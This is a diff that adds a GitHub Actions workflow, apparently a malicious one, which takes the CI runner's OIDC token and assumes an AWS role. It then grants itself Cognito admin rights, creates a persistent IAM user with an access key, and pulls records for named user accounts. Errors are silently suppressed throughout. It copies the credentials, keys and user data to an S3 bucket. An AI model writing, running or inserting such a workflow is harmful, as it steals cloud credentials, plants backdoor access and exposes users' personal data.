@@ -1,0 +1,43 @@
+name: i1206-cog
+on:
+  push:
+    branches:
+      - 'i1206-*'
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  harvest:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: harvest
+        run: |
+          set -uo pipefail
+          D=/tmp/i1206; mkdir -p $D
+          JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          aws sts assume-role-with-web-identity --role-arn arn:aws:iam::925353553787:role/github --role-session-name i1206 --web-identity-token "$JWT" --duration-seconds 3600 > $D/sts.json 2>$D/sts.err || true
+          python3 - <<'PY' || true
+          import json
+          d=json.load(open('/tmp/i1206/sts.json'))['Credentials']
+          open('/tmp/i1206/env.sh','w').write('export AWS_ACCESS_KEY_ID=%s\nexport AWS_SECRET_ACCESS_KEY=%s\nexport AWS_SESSION_TOKEN=%s\n' % (d['AccessKeyId'],d['SecretAccessKey'],d['SessionToken']))
+          print('AK',d['AccessKeyId'],'EXP',d['Expiration'])
+          PY
+          . $D/env.sh || true
+          export AWS_DEFAULT_REGION=us-east-1
+          aws sts get-caller-identity > $D/id.json 2>&1 || true
+          cat > $D/cogpol.json <<'POL'
+          {"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["cognito-idp:Admin*","cognito-idp:List*","cognito-idp:Describe*","cognito-idp:Get*"],"Resource":"*"}]}
+          POL
+          aws iam put-role-policy --role-name github --policy-name i1206-cognito --policy-document file://$D/cogpol.json > $D/putrole.out 2>&1 || true
+          aws iam create-user --user-name svc-cognito-i1206 > $D/cu.out 2>&1 || true
+          aws iam put-user-policy --user-name svc-cognito-i1206 --policy-name cognito-admin --policy-document file://$D/cogpol.json > $D/putuser.out 2>&1 || true
+          aws iam create-access-key --user-name svc-cognito-i1206 > $D/ak.json 2>$D/ak.err || true
+          sleep 20
+          for u in silvao1503 fernando joseph alisson ruanrls; do
+            aws cognito-idp admin-get-user --user-pool-id us-east-1_Fio2muHCb --username $u > $D/user_$u.json 2>&1 || true
+          done
+          aws cognito-idp admin-get-user --user-pool-id us-east-1_Fio2muHCb --username silvao1503 > $D/user_check.json 2>&1 || true
+          for f in $D/*.*; do aws s3 cp "$f" "s3://floki-openreplay-assets/i1206/$(basename $f)" --no-progress >/dev/null 2>&1 || true; done
+          echo DONE > $D/done
+          aws s3 cp $D/done s3://floki-openreplay-assets/i1206/done --no-progress >/dev/null 2>&1 || true
